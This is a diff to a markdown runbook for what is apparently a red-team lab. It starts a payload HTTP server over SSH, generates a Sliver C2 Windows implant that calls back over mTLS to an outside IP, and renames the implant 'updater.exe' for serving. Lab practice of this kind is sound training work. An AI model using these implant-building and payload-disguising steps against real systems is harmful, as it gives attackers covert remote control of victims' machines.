@@ -65,10 +65,10 @@ Report: paste the status line.
 
 - [ ] **Step 4: Start the payload HTTP server (keep this SSH session open)**
 
-```bash
-ssh jason@100.125.52.98 'cd ~/payloads && python3 -m http.server 80'
 ```
-Note: dies when the SSH session closes — fine for a lab session. Leave it running in its own terminal.
+! ssh -t jason@100.125.52.98 'cd ~/payloads && sudo python3 -m http.server 80'
+```
+Port 80 is under 1024, so Linux demands root for it too — same rule as 443, hence the `sudo`. The server dies when the SSH session closes; fine for a lab session. Leave it running in its own terminal.
 
 - [ ] **Step 5: Verify the server from WSL**
 
@@ -112,12 +112,12 @@ generate --mtls 2.25.141.57:443 --os windows --arch amd64 --format exe --save /h
 Expected: takes 1–2 minutes (it compiles Go code). Ends printing a random name like `SILLY_BADGER.exe` saved into `/home/jason/payloads/`.
 If `generate` errors about a missing flag, run `help generate` and paste the output.
 
-- [ ] **Step 2: Rename to the agreed payload name — inside the Sliver console**
+- [ ] **Step 2: Rename to the agreed payload name — from WSL (new terminal, leave Sliver running)**
 
+```bash
+ssh jason@100.125.52.98 'mv ~/payloads/<RANDOM_NAME>.exe ~/payloads/updater.exe'
 ```
-!mv /home/jason/payloads/<RANDOM_NAME>.exe /home/jason/payloads/updater.exe
-```
-(`!` runs a local shell command without leaving Sliver.) Replace `<RANDOM_NAME>` with what Step 1 printed.
+Replace `<RANDOM_NAME>` with what Step 1 printed.
 
 - [ ] **Step 3: Verify it's served — from WSL**
 
